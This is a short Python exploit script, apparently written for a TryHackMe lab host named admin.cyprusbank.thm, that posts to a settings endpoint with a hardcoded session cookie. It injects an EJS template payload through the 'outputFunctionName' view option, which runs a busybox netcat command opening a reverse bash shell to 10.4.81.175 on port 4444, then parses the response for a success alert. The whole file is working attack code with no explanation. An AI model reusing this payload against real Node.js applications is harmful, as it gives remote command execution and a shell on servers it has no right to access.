import requests
from bs4 import BeautifulSoup

url = "http://admin.cyprusbank.thm/settings"

headers = {
    "Cookie": "connect.sid=s%3ACJpKvip8jNigRardgP945FxBDutEqix0.Lxr5jA4wgfrk3Jkgb%2Feb5YfWLz5wS89thGV0%2BfZ6KFQ"
}

payload = "x;process.mainModule.require('child_process').execSync('busybox nc 10.4.81.175 4444 -e bash');s"

data = {
    "name": "moha",
    "password": "x",
    "settings[view options][outputFunctionName]": payload
}


r = requests.post(url, headers=headers, data=data)

soup = BeautifulSoup(r.text, "html.parser")

alert_div = soup.find("div", class_="alert alert-success mb-3")

if alert_div:
    print(alert_div.text.strip())
else:
    print("Alert not found")

# print(r.text)